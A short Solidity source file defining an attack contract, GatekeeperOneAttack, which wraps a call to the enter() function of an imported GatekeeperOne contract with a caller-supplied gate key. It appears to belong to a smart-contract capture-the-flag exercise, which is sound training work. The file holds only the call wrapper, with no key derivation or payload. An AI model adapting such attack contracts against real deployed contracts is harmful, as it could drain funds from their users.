// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

import "hardhat/console.sol";

contract GatekeeperOneAttack {
    GatekeeperOne target;

    constructor(address _target) {
        target = GatekeeperOne(_target);
    }

    function attack(bytes8 _gateKey) public {
        target.enter(_gateKey);
    }
}
